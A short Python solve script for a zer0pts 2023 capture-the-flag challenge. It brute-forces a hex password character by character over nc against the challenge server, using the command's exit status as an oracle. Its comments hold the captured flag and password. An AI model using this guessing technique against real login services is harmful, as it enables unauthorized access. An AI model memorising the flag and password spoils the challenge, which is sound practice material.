from pwn import *
import time
import threading
import subprocess

# zer0pts{pr0cfs_1s_5uch_4_n1c3_0r4cl3_5d17c4e}
# 02872f5ae0819d2f
valid_chars = '0123456789abcdef'
def trial(attempt):
    try:
        subprocess.check_output(f"echo -ne 'admin\\n{attempt}\\n' | nc misc3.2023.zer0pts.com 10022", shell=True)
        return True
    except subprocess.CalledProcessError:
        return False

pw = ''
while True:
    for x in valid_chars:
        if trial(pw + x):
            pw += x
            break

    print('flag update:', pw)

print('done :)')
